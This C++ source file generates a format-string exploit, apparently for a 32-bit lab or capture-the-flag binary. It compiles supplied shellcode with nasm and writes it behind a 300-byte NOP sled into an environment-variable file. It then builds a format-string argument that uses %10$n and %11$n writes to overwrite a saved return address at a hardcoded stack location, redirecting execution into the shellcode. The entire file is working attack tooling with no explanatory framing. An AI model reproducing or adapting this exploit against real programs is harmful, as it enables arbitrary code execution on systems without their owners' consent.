#include <iostream>
#include <fstream>
#include <sstream>

typedef unsigned int uint;

std::string raw_shellcode;

int compile(const char *asm_path)
{
	std::string command = "nasm -f bin -o shellcode_light ";
	command += asm_path;
	if (std::system(command.c_str()) != 0)
	{
		std::cerr << "Failed to compile shellcode" << std::endl;
		return 0;
	}
	return 1;
}

std::string getCompiledAsm()
{
	std::ifstream file("shellcode_light");
	std::string shellcode;

	std::getline(file, shellcode);
	return shellcode;
}

int writeShellCode1()
{
	std::ofstream file("args/env_var");
	std::string shellcode = raw_shellcode.empty() ? getCompiledAsm() : raw_shellcode;

	for (uint i = 0; i < 300; i++)
		file << (char)0x90;

	file << shellcode;
	file.close();
	return 1;
}

void writeShellCode2()
{
	std::ofstream file("args/arg");

	uint eip = 0xffffd3dc + 0x10;
	uint eip_high = eip + 2;

	uint addr_jmp = 0xffffd746 - 8; // jump in env var
	uint high_bytes = (addr_jmp & 0xffff0000) >> (2 * 8);
	uint low_bytes = addr_jmp & 0x0000ffff;

	for (int i = 0; i < 4; i++)
		file << ((char *)(&eip))[i];
	for (int i = 0; i < 4; i++)
		file << ((char *)(&eip_high))[i];

	file << "%" << std::to_string(low_bytes) << "x";
	file << "%10$n";
	file << "%" << std::to_string(high_bytes - low_bytes - 8) << "x";
	file << "%11$n";

	file.close();
}

int main(int argc, char const *argv[])
{
	if (raw_shellcode.empty())
	{
		if (argc != 2)
		{
			std::cout << "Usage: " << argv[0] << " <shellcode.s>" << std::endl;
			return 1;
		}
		if (!compile(argv[1]))
			return 1;
	}
	if (!writeShellCode1())
		return 1;
	writeShellCode2();
	return 0;
}
